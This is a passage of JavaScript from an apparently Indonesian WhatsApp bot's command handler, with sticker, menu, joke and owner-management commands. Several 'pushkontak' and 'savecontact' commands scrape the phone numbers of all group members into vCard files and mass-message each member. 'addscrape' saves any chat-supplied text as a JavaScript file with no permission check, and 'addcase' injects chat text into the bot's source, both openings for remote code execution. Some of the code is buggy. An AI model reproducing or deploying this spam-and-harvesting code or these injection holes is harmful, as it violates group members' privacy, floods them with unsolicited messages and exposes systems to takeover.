 break

 case 'list-jadibot': 
if (!isPremium) return reply("*`Khusus Prem Saya kak`*")
try {
let user = [... new Set([...global.conns.filter(danzz => danzz.user).map(danzz => danzz.user)])]
te = "*-- List Jadibot --*\n\n"
for (let i of user){
y = await ptz.decodeJid(i.id)
te += " •• User : @" + y.split("@")[0] + "\n"
te += " •• Name : " + i.name + "\n\n"
}
ptz.sendMessage(m.chat,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
m.reply(`Belum Ada User Yang Jadibot`)
}
break 

case "start-jadibot":
 if (!isPremium) return reply("*`Khusus Prem Saya kak`*")
 if (!text) return m.reply("Tambah kan nomor yang mau di start")
try {
let user = [... new Set([...global.conns.filter(danzz => danzz.user).map(danzz => danzz.user)])]
await jadibot(ptz, text, m, frommeky)
} catch (err) {
m.reply(`Belum Ada User Yang Jadibot`)
}
break


case 'toimage': case 'toimg': {

 if (!quoted) reply ('m?.reply Image')
if (!/webp/.test(mime)) reply (`Balas sticker dengan caption *${prefix + command}*`)
let media = await ptz.downloadAndSaveMediaMessage(quoted)
let ran = 'jjsjsnsu.png'
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) reply (err)
let buffer = fs.readFileSync(ran)
ptz.sendMessage(m.chat, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
break

case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
 axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
     ptz.sendImageAsSticker(m.chat, data.url, m, { packname: `${global.packname}`, author: `${global.author}`})
     
     })
break



case 'stickhandhold': {
axios.get(`https://api.waifu.pics/sfw/handhold`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickshinobu': {
axios.get(`https://api.waifu.pics/sfw/shinobu`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhighfive': {
axios.get(`https://api.waifu.pics/sfw/highfive`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcuddle': {
axios.get(`https://api.waifu.pics/sfw/cuddle`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcringe': {
axios.get(`https://api.waifu.pics/sfw/cringe`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickdance': {
axios.get(`https://api.waifu.pics/sfw/dance`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhappy': {
axios.get(`https://api.waifu.pics/sfw/happy`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickglomp': {
axios.get(`https://api.waifu.pics/sfw/glomp`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticksmug': {
axios.get(`https://api.waifu.pics/sfw/smug`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickblush': {
axios.get(`https://api.waifu.pics/sfw/blush`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickawoo': {
axios.get(`https://api.waifu.pics/sfw/awoo`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickwave': {
axios.get(`https://api.waifu.pics/sfw/wave`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticksmile': {
axios.get(`https://api.waifu.pics/sfw/smile`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickslap': {
axios.get(`https://api.waifu.pics/sfw/slap`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticknom': {
axios.get(`https://api.waifu.pics/sfw/nom`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickpoke': {
axios.get(`https://api.waifu.pics/sfw/poke`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickwink': {
axios.get(`https://api.waifu.pics/sfw/wink`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbonk': {
axios.get(`https://api.waifu.pics/sfw/bonk`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbully': {
axios.get(`https://api.waifu.pics/sfw/bully`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickyeet': {
axios.get(`https://api.waifu.pics/sfw/yeet`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbite': {
axios.get(`https://api.waifu.pics/sfw/bite`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickkiss': {
axios.get(`https://api.waifu.pics/sfw/kiss`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticklick': {
axios.get(`https://api.waifu.pics/sfw/lick`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickpat': {
axios.get(`https://api.waifu.pics/sfw/pat`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhug': {
axios.get(`https://api.waifu.pics/sfw/hug`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickkill': {
axios.get(`https://api.waifu.pics/sfw/kill`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcry': {
axios.get(`https://api.waifu.pics/sfw/cry`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickspank':{
                axios.get(`https://nekos.life/api/v2/img/spank`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticktickle':{
                axios.get(`https://nekos.life/api/v2/img/tickle`)
.then(({data}) => {
ptz.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break

case 'cekkhodam': case 'cekkodam': {
if (!text) return m.reply("ketik nama mu")
 
	const khodam = pickRandom([
	 "Kaleng Cat Avian",
	 "Pipa Rucika",
     "King Hitam",
     "Lemari dua Pintu",
     "Kacang Hijau",
     "Kulkas mini",
     "Burung beo",
     "Air",
     "Api",
     "Batu",
     "Magnet",
     "Sempak",
	 "Botol Tupperware",
	 "Badut Mixue",
	 "Sabun GIV",
	 "Sandal Swallow",
	 "Jarjit",
	 "Ijat",
	 "Fizi",
	 "Mail",
	 "Ehsan",
	 "Upin",
	 "Ipin",
	 "sungut lele",
	 "Tok Dalang",
	 "Opah",
	 "Opet",
	 "Alul",
	 "Pak Vinsen",
	 "Maman Resing",
	 "Pak RT",
	 "Admin ETI",
	 "Bung Towel",
	 "Lumpia Basah",
     "Bjorka",
     "Hacker",
	 "Martabak Manis",
	 "Baso Tahu",
	 "Tahu Gejrot",
	 "Dimsum",
     "Seblak",
     "Aromanis",
     "Gelembung sabun",
     "Kuda",
	 "Seblak Ceker",
	 "Telor Gulung",
	 "Tahu Aci",
	 "Tempe Mendoan",
	 "Nasi Kucing",
	 "Kue Cubit",
	 "Tahu Sumedang",
	 "Nasi Uduk",
	 "Wedang Ronde",
	 "Kerupuk Udang",
	 "Cilok",
	 "Cilung",
	 "Kue Sus",
	 "Jasuke",
	 "Seblak Makaroni",
	 "Sate Padang",
	 "Sayur Asem",
	 "Kromboloni",
	 "Marmut Pink",
	 "Belalang Mullet",
	 "Kucing Oren",
	 "Lintah Terbang",
	 "Singa Paddle Pop",
	 "Macan Cisewu",
	 "Vario Mber",
	 "Beat Mber",
	 "Supra Geter",
	 "Oli Samping",
	 "Knalpot Racing",
	 "Jus Stroberi",
	 "Jus Alpukat",
	 "Alpukat Kocok",
	 "Es Kopyor",
	 "Es Jeruk",
	 "@whiskeysockets/baileys",
	 "chalk",
	 "gradient-string",
	 "@adiwajshing",
	 "d-scrape",
	 "undefined",
	 "cannot read properties",
	 "performance-now",
    "os",
"node-fetch",
"form-data",
"axios",
"util",
"fs-extra",
"scrape-primbon",
"child_process",
"emoji-regex",
"check-disk-space",
"perf_hooks",
"moment-timezone",
"cheerio",
"fs",
"process",
"require( . . . )",
"import ... from ...",
"rate-overlimit",
	 "Cappucino Cincau",
	 "Jasjus Melon",
	 "Teajus Apel",
	 "Pop ice Mangga",
	 "Teajus Gulabatu",
	 "Air Selokan",
	 "Air Kobokan",
	 "TV Tabung",
	 "Keran Air",
	 "Tutup Panci",
	 "Kotak Amal",
	 "Tutup Termos",
	 "Tutup Botol",
	 "Kresek Item",
	 "Kepala Casan",
	 "Ban Serep",
	 "Kursi Lipat",
	 "Kursi Goyang",
	 "Kulit Pisang",
	 "Warung Madura",
	 "Gorong-gorong",
	])
 
	const response = `Khodam: ${khodam}\n <!> Jangan lupa di tap-tap`
 
	m.reply(response)
 }
break

case 'antilink': case 'antimenu': case 'antilinkmenu':
if (!isGroup) return
try {
 let sections = [{
		title: '- Anti Menu Selection -', 
		rows: [{
	 title: 'Antilink All [ ON ]',
 	description: `<!> Enable Feature •`, 
 	id: `${prefix}antilinkall on`
 }, 
{
 title: 'Antilink All [ OFF ]',
 description: "<!> Disable Feature",
 id: `${prefix}antilinkall off`
 },
 {
 title: 'Antilink Group [ ON ]',
 description: "<!> Enable Feature",
 id: `${prefix}antilinkgc on`
 },
 {
 title: 'Antilink Group [ OFF ]',
 description: "<!> Disable Feature",
 id: `${prefix}antilinkgc off`
 },
 {
 title: 'Antilink Wa.me [ ON ]',
 description: "<!> Enable Feature",
 id: `${prefix}antiwame on`
 },
 {
 title: 'Antilink Wa.me [ OFF ]',
 description: "<!> Disable Feature",
 id: `${prefix}antiwame off`
 },
 {
 title: 'Antilink Facebook [ ON ]',
 description: "<!> Display All Tools Feature",
 id: `${prefix}antilinkfb on`
 },
 {
 title: 'Antilink Facebook [ OFF ]',
 description: "<!> Disable Feature",
 id: `${prefix}antilinkfb off`
 },
 {
 title: 'Antilink Tiktok [ ON ]',
 description: "<!> Enable Feature",
 id: `${prefix}antilinktt on`
 },
 {
 title: 'Antilink Tiktok [ OFF ]',
 description: "<!> Disable Feature",
 id: `${prefix}antilinktt off`
 },
 {
 title: 'Antilink Telegram [ ON ]',
 description: "<!> Enable Feature",
 id: `${prefix}antilinktele on`
 },
 {
 title: 'Antilink Telegram [ OFF ]',
 description: "<!> Disable Feature",
 id: `${prefix}antilinktele off`
 }, 
 {
 title: 'Antilink Twiter [ ON ]',
 description: "<!> Enable Feature",
 id: `${prefix}antilinktwit on`
 }, 
 {
 title: 'Antilink Twiter [ OFF ]',
 description: "<!> Disable Feature",
 id: `${prefix}antilinktwit off`
 },
 {
 title: 'Antilink Yt vid [ ON ]',
 description: "<!> Enable Feature",
 id: `${prefix}antilinkytvid on`
 }, 
 {
 title: 'Antilink Yt Vid [ OFF ]',
 description: "<!> Disable Feature",
 id: `${prefix}antilinkytvid off`
 },
 {
 title: 'Antilink Yt ch [ ON ]',
 description: "<!> Enable Feature",
 id: `${prefix}antilinkytch on`
 }, 
 {
 title: 'Antilink Yt ch [ OFF ]',
 description: "<!> Disable Feature",
 id: `${prefix}antilinkytch off`
 }]
}]

let listMessage = {
 title: "Selection",
 sections
};

let msghhhhhhhhhhhhhhhhhhhk = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m?.sender],
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '12036326753195844@newsletter',
 newsletterName: `${global.botname} • ${runtime(process.uptime())}`,
 serverMessageId: -1
 },
 businessMessageForwardInfo: {
 businessOwnerJid: ptz.decodeJid(ptz.user.id)
 },
 externalAdReply: {
 title: global.title,
 body: global.body,
 thumbnailUrl: "https://ibb.co/RzjB6pj",
 sourceUrl: global.sourceurl,
 mediaType: 1,
 renderLargerThumbnail: true
 }
 },
 body: proto.Message.InteractiveMessage.Body.create({
 text: ""
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `© ${footer}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 thumbnailUrl: "",
 gifPlayback: true,
 subtitle: "Multi Device",
 hasMediaAttachment: false,
 /*...(await prepareWAMessageMedia({
 document: fs.readFileSync('./package.json'),
 mimetype: "application/msword",
 jpegThumbnail:fs.readFileSync("./thum.jpg"),
fileName: global.filename,
 }, {
 upload: ptz.waUploadToServer
 }))*/
 }),
 gifPlayback: true,
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [{
 "name": "single_select",
 "buttonParamsJson": JSON.stringify(listMessage)
 }]
 })
 })
 }
 }
}, {
 quoted: fsaluran
});

await ptz.relayMessage(msghhhhhhhhhhhhhhhhhhhk.key.remoteJid, msghhhhhhhhhhhhhhhhhhhk.message, {
 messageId: msghhhhhhhhhhhhhhhhhhhk.key.id
});
} catch(err) {
console.clear()
}
break

case'smeta': {
function makeid(length) {
let result = "";
const characters =
"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
const charactersLength = characters.length;

for (let i = 0; i < length; i++) {
result += characters.charAt(
Math.floor(Math.random() * charactersLength),
);
}
return result;
}
async function addExifAvatar(
 buffer,
 packname,
 author,
 categories = [""],
 extra = {},
) {
 const {
default: { Image },
 } = await import("node-webpmux");
 const img = new Image();
 const json = {
"sticker-pack-id": "Natsxe",
"sticker-pack-name": packname,
"sticker-pack-publisher": author,
emojis: categories,
"is-avatar-sticker": 1,
...extra,
 };
 let exifAttr = Buffer.from([
0x49, 0x49, 0x2a, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57,
0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00,
 ]);
 let jsonBuffer = Buffer.from(JSON.stringify(json), "utf8");
 let exif = Buffer.concat([exifAttr, jsonBuffer]);
 exif.writeUIntLE(jsonBuffer.length, 14, 4);
 await img.load(buffer);
 img.exif = exif;
 return await img.save(null);
 }
 

 var stiker = false
 try {
 let [packname, ...author] = q.split('|')
 //var author = (author []).join('|')
 let mime = m.quoted.mimetype || ''
 if (!/webp/.test(mime)) throw m.reply('Reply sticker!')
 //let img = await q.download()
 let img = await ptz.downloadAndSaveMediaMessage(quoted, makeid(5))
 if (!img) throw 'Reply a sticker!'
 var stiker = await addExifAvatar(img, `ziyo`, `${pushname}`)
 } catch (e) {
 console.error(e)
 if (Buffer.isBuffer(e)) stiker = e
 } finally {
 if (stiker) ptz.sendMessage(m.chat, {
 sticker: stiker
 }, {
 quoted: m
 })
 else throw 'reply sticker'
 }
 }
 
 break







case "addscrape":
if (!text) return reply(` *Example :* ${prefix + command} y2mateid`)
 try {
 if (!m.quoted.text) return m.reply(`🚩 Reply Code Message!`)
 let path = `./lib/${text}.js`
 await fs.writeFileSync(path, m.quoted.text)
 reply(`🚩 Saved in ${path}`)
 } catch (error) {
 console.log(error)
 m.reply("🚩 Reply Code Message!")
 }
break

case "setgoodbye": 
 if (!text) throw "Masukan Deskripsi nya"
 chatdb.setgoodbye = text
 m.reply("Succes")
 break
case 'addcase': {
                if (!isCreator) return reply('?')
    if (!text) return ('Tambahkan case yang ingin di masukan');
const namaFile = './message.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                reply('Error File:', err);
            } else {
                reply('Sukses Menambahkan case');
            }
        });
    } else {
        reply('Gagal Menambahkan case');
    }
});

}
break;
case 'gimage': case "ai-search":{
if (!text) return reply(`Example : ${prefix + command} ganyu genshin impact`)
let gis = require('g-i-s')
gis(text, async (error, result) => {
let n = result
let images = n[Math.floor(Math.random() * n.length)].url
ptz.sendMessage(m.chat, { image: images, caption: `${text}`}, { quoted:fsaluran })
})
}
break

    
    
    
    
    
    
   
    
    
   
    
    
    
    
    
    
    // pushcontact 
    
  // IS THERE NO REPLY OR REPLY PROCESS? , BECAUSE I WANT TO GO TO 1 DESTINATION AND NOT WASTE TIME
  
  // zio
  
      case "cekidgc": case "listgroup": {
if (!isPremium) return reply("Ouh")
let getGroups = await ptz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `*${m2}[ LIST GROUP DI BAWAH ]${m2}*\n\nSaya Tambahkan .id agar tes dapat tersalin, id group hanya berupa nomor`



for (let x of anu) {
let metadata2 = await ptz.groupMetadata(x)
const idnyahrooo = metadata2.id.replace(/@g\.us/g, '.id')
teks += `\n•─ ─────────── ─•
⟡ Nama : ${metadata2.subject}
⟡ ID : ${idnyahrooo}
⟡ Member : ${metadata2.participants.length}
•─ ─────────── ─•\n`
}
reply(teks)
}
break
case "pushkontakv1":{
if (!isCreator) return m.reply("Ouh")
if (isGroup) return reply("Kusus di Chat Pribadi")
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|tekspushkontak\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)

const groupMetadataa = !isGroup? await ptz.groupMetadata(`${text.split("|")[0]}@g.us`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkon = text.split("|")[1]
if (isContacts) return
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await ptz.downloadAndSaveMediaMessage(quoted)
memk = await TelegraPh(media)
await ptz.sendMessage(mem, { image: { url: memk }, caption: global.tekspushkon })
await sleep(1000)
} else {
await ptz.sendMessage(mem, { text: global.tekspushkon })
await sleep(1000)
}
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:KONTAK SI: ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await ptz.sendMessage(m.chat, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}
break
case "pushkontakv2":{
if (!isCreator) return reply("Ouh")
if (!isGroup) return reply("Khusus Di Group")
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)

const groupMetadata = isGroup? await ptz.groupMetadata(m.chat).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv2 = text
if (isContacts) return
for (let men of halsss) {
contacts.push(men)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await ptz.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)

setTimeout(async () => {
 ptz.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
}, 2100)
} else {
setTimeout(async () => {
ptz.sendMessage(men, { text: global.tekspushkonv2 })
}, 2100)
}
}
reply("File Kontak Sudah Di Kirim Lewat Chat Pribadi")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:KONTAK SI: ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await ptz.sendMessage(sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}
break
case "pushkontakv3":
if (!isCreator) return reply("Ouh")
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|jeda|teks\nUntuk Liat Id Group Silahkan Ketik .idgroup`)
console.log("?") //   ini pengalih
const groupMetadataa = !isGroup? await ptz.groupMetadata(`${q.split("|")[0]}@g.us`).catch(e => {}) : ""
const participantss = !isGroup? await groupMetadataa.participants : ""
const halls = await participantss.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv3 = q.split("|")[2]
for (let mem of halls) {
if (/image/.test(mime)) {
media = await ptz.downloadAndSaveMediaMessage(quoted)
memk = await TelegraPh(media)

setTimeout(async () => {
 ptz.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv3 })
}, q.split("|")[1])

} else {
setTimeout(async () => {
ptz.sendMessage(mem, { text: global.tekspushkonv3 })
}, q.split("|")[1])
}
}
reply("sukses")
break
case "pushkontakv4":
if (!isCreator) return reply("Ouh")
if (!isGroup) return reply("Khusus grup Private")
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} jeda|teks`)
console.log('?') // ini juga pengalih
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv4 = text.split("|")[1]
for (let men of halsss) {
if (/image/.test(mime)) {
media = await ptz.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPH(media)

setTimeout(async () => {
 ptz.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv4 })
}, text.split("|")[0])
} else {
setTimeout(async () => {
await ptz.sendMessage(men, { text: global.tekspushkonv4 })
}, text.split("|")[0])
}
}
reply("Sukses")
break
case "savecontactv1": {
if (!isCreator) return reply("Ouh")
if (!isGroup) return reply(`Maaf Kak Fitur ${prefix+command} Hanya Bisa Di Gunakan Di Dalam Group\nUntuk Memasukan Bot Ke Dalam Group Yang Di Ingin Kan\nSilahkan Ketik Command .join linkgroup`)

const groupMetadata = isGroup? await ptz.groupMetadata(m.chat).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let men of halsss) {
if (isContacts) return
contacts.push(men)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}
reply("Sukses File Sudah Di Kirim Lewat Chat Private")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:KONTAK SI: ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await ptz.sendMessage(sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}
break
case 'getcontact': case 'getkontak':
if (!isPremium) return reply("Ouh")
if (!isGroup) return m.reply(`Khusus Group`)
huhuhs = await ptz.sendMessage(m.chat, {
    text: `Grup; *${groupMetadata.subject}*\nTotal peserta; *${participants.length}*\n\nSending contact...`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000) 
ptz.sendContact(m.chat, participants.map(a => a.id), huhuhs)
break
case 'savekontak': case 'svkontak':
if (!isCreator) return reply("Ouh")
if (!isGroup) return m.reply(`Khusus Group`)
let cmiggc = await ptz.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
}
let nmfilect = './database/contacts.vcf'
reply('*Mengimpor '+cmiggc.participants.length+' kontak..*')
fs.writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
ptz.sendMessage(m.chat, {
    document: fs.readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: 'GROUP: *'+cmiggc.subject+'*\nMEMBER: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
fs.unlinkSync(nmfilect)
break
case 'sendkontak': case 'kontak':
if (!isCreator) return reply("Ouh")
if (!isGroup) return m.reply("Harus di  grup")
if (!m.mentionedJid[0]) return reply('Example: .kontak @tag|nama')
let snTak = text.split('|')[1] ? text.split('|')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split("@")[0]+":"+m.mentionedJid[0].split("@")[0]+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
}
ptz.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
break
case "savecontactv2": {
if (!isCreator) return reply("Ouh")
if (isGroup) return reply("Khusus Di Chat Private")
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)

const groupMetadataa = !isGroup? await ptz.groupMetadata(`${text}@g.us`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:KONTAK SI: ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await ptz.sendMessage(m.chat, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}
break
    
    
    // jangan oplek
    case 'addowner': {
if (!isCreator) return m.reply("Kamu belum jadi owner")
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6831#####`)
prem1 = text.replace(/[^0-9]/g, '')
let cek1 = await ptz.onWhatsApp(prem1 + `@s.whatsapp.net`)
if (cek1.length == 0) return (`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
newowner.push(prem1)
fs.writeFileSync('./database/owner.json', JSON.stringify(newowner))
m.reply(`*${prem1} Telah menjadi owner*`)
}
break

case 'delowner': {
if (!isCreator) return m.reply("Kamu belum jadi owner")
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 2347#####`)
prem2 = text.replace(/[^0-9]/g, '')
unp = newowner.indexOf(prem2)
newowner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(newowner))
m.reply(`*${prem2} Tidak lagi Menjadi owner*`)
}
break
case 'veemon':
        let chattttkkkkk = db.data.chats[m.chat];
